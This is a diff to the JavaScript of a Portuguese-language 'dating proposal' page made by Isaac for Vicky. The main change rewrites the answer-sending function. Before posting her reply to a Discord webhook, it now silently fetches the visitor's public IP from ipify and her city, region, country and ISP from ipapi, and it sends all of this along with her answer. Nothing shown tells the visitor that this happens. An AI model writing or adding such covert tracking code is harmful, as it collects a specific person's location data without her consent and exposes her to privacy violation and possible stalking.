@@ -21,7 +21,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 const img = document.createElement('img');
                 img.src = e.target.result;
                 img.style.cssText = 'width:100%;height:100%;object-fit:cover;border-radius:12px;';
-                
+
                 const overlay = document.createElement('div');
                 overlay.className = 'photo-overlay';
                 overlay.innerHTML = '<span>Clique para alterar</span>';
@@ -143,30 +143,96 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // --- Send Discord Webhook ---
+    // --- Send response com IP e localização ---
     function sendResponse(response) {
-        const data = {
-            content: null,
-            embeds: [{
-                title: "> Pedido de Namoro!",
-                description: `Oi Vicky!\nEla respondeu: **${response.toUpperCase()}**`,
-                color: response==='sim'?0xFF69B4:response==='talvez'?0xFFA500:0xFF4500,
-                fields: [
-                    {name: "> Data e Hora", value: new Date().toLocaleString('pt-BR'), inline:true},
-                    {name: "> Mensagem Especial", value: response==='sim'?"Estou super feliz! 😍":response==='talvez'?"Vamos pensar juntos 💭":"Tudo bem, sem problemas 💔", inline:true}
-                ],
-                thumbnail: {url:"https://cdn.discordapp.com/attachments/1418342607511228548/1418343348380373072/hellokitty8-removebg-preview.png"},
-                footer: {text:"Pedido de Namoro • Isaac para Vicky", icon_url:"https://cdn.discordapp.com/attachments/1404154385180917881/1418334265610997893/e100e4dfc3b9b5369742060e99055a04.jpg"}
-            }],
-            username: "Wowowowowow",
-            avatar_url:"https://cdn.discordapp.com/attachments/1418342607511228548/1418343348380373072/hellokitty8-removebg-preview.png"
-        };
+        // Primeiro busca o IP público IPv4 usando ipify
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                const ip = ipData.ip;
 
-        fetch(WEBHOOK_URL, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)})
-            .then(res => res.ok ? console.log('Resposta enviada com sucesso!') : console.error('Erro ao enviar:', res.status))
-            .catch(err => console.error(err));
+                // Depois busca localização e outros dados pelo ipapi
+                fetch('https://ipapi.co/json/')
+                    .then(res => res.json())
+                    .then(data => {
+                        const city = data.city || 'Desconhecida';
+                        const region = data.region || 'Desconhecida';
+                        const country = data.country_name || 'Desconhecido';
+                        const org = data.org || 'Desconhecida';
 
-        localStorage.setItem('respostaNamoro', response);
+                        const locationString = `${city}, ${region}, ${country}`;
+
+                        const payload = {
+                            content: null,
+                            embeds: [{
+                                title: "> Pedido de Namoro!",
+                                description: `Oi Vicky!\nEla respondeu: **${response.toUpperCase()}**`,
+                                color: response === 'sim' ? 0xFF69B4 : response === 'talvez' ? 0xFFA500 : 0xFF4500,
+                                fields: [
+                                    {
+                                        name: "> Data e Hora",
+                                        value: new Date().toLocaleString('pt-BR'),
+                                        inline: true
+                                    },
+                                    {
+                                        name: "> IP",
+                                        value: ip,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "> Localização",
+                                        value: locationString,
+                                        inline: false
+                                    },
+                                    {
+                                        name: "> Provedor (ISP)",
+                                        value: org,
+                                        inline: false
+                                    },
+                                    {
+                                        name: "> Mensagem Especial",
+                                        value:
+                                            response === 'sim'
+                                                ? "Estou super feliz! 😍"
+                                                : response === 'talvez'
+                                                ? "Vamos pensar juntos 💭"
+                                                : "Tudo bem, sem problemas 💔",
+                                        inline: false
+                                    }
+                                ],
+                                thumbnail: {
+                                    url: "https://cdn.discordapp.com/attachments/1418342607511228548/1418343348380373072/hellokitty8-removebg-preview.png"
+                                },
+                                footer: {
+                                    text: "Pedido de Namoro • Isaac para Vicky",
+                                    icon_url: "https://cdn.discordapp.com/attachments/1404154385180917881/1418334265610997893/e100e4dfc3b9b5369742060e99055a04.jpg"
+                                }
+                            }],
+                            username: "Wowowowowow",
+                            avatar_url: "https://cdn.discordapp.com/attachments/1418342607511228548/1418343348380373072/hellokitty8-removebg-preview.png"
+                        };
+
+                        fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(payload)
+                        })
+                            .then(res => {
+                                if (res.ok) {
+                                    console.log('Resposta, IP e localização enviados com sucesso!');
+                                } else {
+                                    console.error('Erro ao enviar:', res.status);
+                                }
+                            })
+                            .catch(err => console.error('Erro ao enviar para o Discord:', err));
+
+                        localStorage.setItem('respostaNamoro', response);
+                    })
+                    .catch(err => console.error('Erro ao obter localização:', err));
+            })
+            .catch(err => console.error('Erro ao obter IP:', err));
     }
 
     // NÃO mostramos a declaração automaticamente mais!
